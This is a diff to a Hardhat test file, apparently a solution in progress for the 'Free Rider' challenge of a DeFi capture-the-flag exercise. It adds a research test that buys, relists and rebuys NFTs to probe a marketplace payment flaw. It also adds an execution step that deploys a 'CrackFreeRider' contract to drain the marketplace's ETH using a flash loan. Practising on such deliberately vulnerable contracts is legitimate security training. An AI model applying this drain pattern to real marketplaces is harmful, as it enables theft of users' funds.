@@ -7,6 +7,7 @@ const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
 
+
 describe('[Challenge] Free Rider', function () {
     let deployer, player, devs;
     let weth, token, uniswapFactory, uniswapRouter, uniswapPair, marketplace, nft, devsContract;
@@ -104,8 +105,97 @@ describe('[Challenge] Free Rider', function () {
         );
     });
 
+    it('reseatch', async function () {
+      async function research() {
+        // the target is to drain all eth from marketplace contract
+        const HIGHER_PRICE = NFT_PRICE + MARKETPLACE_INITIAL_ETH_BALANCE / 6n;
+        //simulate flash loan
+        const FLASH_LOAN_AMOUNT = NFT_PRICE * 6n * 2n + HIGHER_PRICE + 1n * 10n ** 18n;
+        
+
+        //setBalance(player.address, FLASH_LOAN_AMOUNT);
+        // second buying all nfts
+        console.log('Player`s ballance before:',  await ethers.provider.getBalance(player.address));
+        await marketplace.connect(player).buyMany([0, 1, 2, 3, 4, 5], {value: NFT_PRICE * 6n});
+        console.log('Player`s balance after buying all NFTs:',  await ethers.provider.getBalance(player.address));
+        await player.sendTransaction({
+          to: marketplace.address,
+          value: NFT_PRICE * 4n
+        });
+
+          for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
+              expect(await nft.ownerOf(tokenId)).to.be.eq(player.address);
+          }
+
+        console.log('Now all NFTs are owned by player');
+        
+
+        await nft.connect(player).setApprovalForAll(marketplace.address, true);
+        console.log('Approval is set');
+
+
+        await marketplace.connect(player).offerMany([0, 1, 2, 3, 4, 5], [HIGHER_PRICE, HIGHER_PRICE, HIGHER_PRICE, HIGHER_PRICE, HIGHER_PRICE, HIGHER_PRICE]);
+        console.log('NFTs are offered');
+        console.log('Player`s balance before buyback: ',  await ethers.provider.getBalance(player.address));
+        console.log('Marketplace balance: ', await ethers.provider.getBalance(marketplace.address));
+        console.log(`Higher price: ${HIGHER_PRICE}`);
+        await marketplace.connect(player).buyMany([0, 1, 2, 3, 4, 5], {value: HIGHER_PRICE });
+
+        console.log('Player`s after buying all NFT`s with higher price: ',  await ethers.provider.getBalance(player.address));
+
+        const playerBalance = await ethers.provider.getBalance(player.address);
+        console.log('Player`s ballance after: ',  playerBalance);
+        console.log('Marketplace ballance after: ',  await ethers.provider.getBalance(marketplace.address));
+        console.log(`Player have gained ${playerBalance - Number(FLASH_LOAN_AMOUNT)}`);
+        //player can gain additional 90 ETH - the full balance of marketplace contract
+        // and also 45 ETH bounty - total additional 135 ETH to re-pay flash loan
+        // third - offering nfts with higher NFT_PRICE
+        // fourth - re-paying flash loan
+        // 
+        // transfer all tokens to dev contract
+        const abi = [
+          "function safeTransferFrom(address, address, uint256, bytes) public payable"
+        ];
+        const NFTContract = new ethers.Contract(nft.address, abi, player);
+        
+        for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
+            
+            await NFTContract.safeTransferFrom(
+              player.address,
+              devsContract.address,
+              tokenId,
+              ethers.utils.defaultAbiCoder.encode([ "address" ], [ player.address ])
+            );
+            expect(await nft.ownerOf(tokenId)).to.be.eq(devsContract.address);
+        }
+
+        console.log('All NFTs been transferred to devsContract');
+
+      }
+    });
+
+    
+
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+      /** CODE YOUR SOLUTION HERE */
+      
+      // first taking flash loan from Uniswap pool - skip for now
+      // minimal amount is NFT_PRICE * 6n
+      // take a flashloan of 90 ETH
+
+      const crackContract = await (await ethers.getContractFactory('CrackFreeRider', player)).deploy(
+          uniswapFactory.address,
+          uniswapPair.address,
+          weth.address,
+          nft.address,
+          devsContract.address
+      );
+
+      console.log('Address of marketplace(test): ', marketplace.address);
+      console.log('Address of player(test): ', player.address);
+      await crackContract.hackIt(marketplace.address);
+      console.log('Flash loan flow completed');
+      console.log('Players balance is: ', await ethers.provider.getBalance(player.address));
     });
 
     after(async function () {
